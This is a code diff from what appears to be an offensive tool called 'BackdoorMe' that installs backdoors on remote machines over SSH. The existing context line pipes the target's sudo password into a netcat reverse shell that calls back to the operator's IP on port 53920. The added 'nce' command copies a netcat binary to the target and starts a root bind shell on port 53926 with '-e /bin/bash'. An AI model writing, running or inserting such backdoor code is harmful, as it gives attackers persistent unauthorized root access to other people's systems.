@@ -127,6 +127,19 @@ class BackdoorMe(cmd.Cmd):
         self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S nohup cat /tmp/f | nohup /bin/bash -i 2>&1 | nohup nc " + self.localIP + " 53920 > sudo nohup /tmp/f &")
         print(GOOD + "Netcat backdoor on port 53920 attempted.")
 
+    def do_nce(self, args):
+        t = self.get_target(args)
+        if t == None:
+                return
+        if not t.is_open:
+            print BAD + "No SSH connection to target. Run \"open\" to start a connection."
+            return
+	print("Shipping netcat-traditional package.")
+	self.curtarget.scpFiles(self, '/bin/nc.traditional', False)
+        print("Initializing backdoor on port 53926...")
+	self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S nohup ./nc.traditional -l -p 53926 -e /bin/bash")
+	print(GOOD + "Backdoor attempted. Use nc " + self.curtarget.hostname + " 53926.")
+
     def do_perl(self,args):
         t = self.get_target(args)
         if t == None:
